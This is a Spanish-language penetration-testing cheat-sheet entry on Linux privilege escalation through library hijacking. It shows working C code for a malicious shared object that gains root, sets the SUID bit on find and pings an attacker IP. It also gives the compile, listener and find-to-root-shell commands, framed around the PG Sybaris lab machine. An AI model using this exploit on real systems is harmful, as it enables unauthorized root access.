
## DESCRIPTION
Si encontramos un binario que tiene una llamada a una librería y que da error. Por ejemplo:

![[Pasted image 20230629173103.png]]

**!!NOTA IMPORTANTE!!** 
Tenemos que tener permiso de escritura en el directorio de la librería

![[Pasted image 20230629173201.png]]

Identificamos que falta la libreria utils.so

#### Mas información
* https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ld.so.conf-example


## EXPLOITATION

1º Creamos nuestra reverse shell o en este caso nuestro exploit en c (en este caso le añade el bit SUID a find)

```
# include <stdio.h>
# include <stdlib.h>
# include <sys/types.h>

static void kashz() __attribute__((constructor));
void kashz() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("chmod +s /usr/bin/find");
        system("ping 192.168.45.220 -c 2");
}

```

2. La transferimos a la maquina

3. La compilamos con el nombre de la libreria faltante:

```
gcc -shared -o utils.so -fPIC library.c 
```
**!!NOTA IMPORTANTE!!**
Incluir el -shared
4. Como se trata de una tarea programada, nos ponemos a la escucha para ver si nos llega el ping y comprobamos que le ha puesto el bit s a find

```
# En nuestra maquina
sudo tcpdump -i tun0 icmp
```

5. En este caso explotamos el FIND para escalar privilegios:

```
find . -exec /bin/sh -p \; -quit
```

## MACHINES

* Hack The Box: 
* PG: Sybaris

**!!NOTA IMPORTANTE!!** 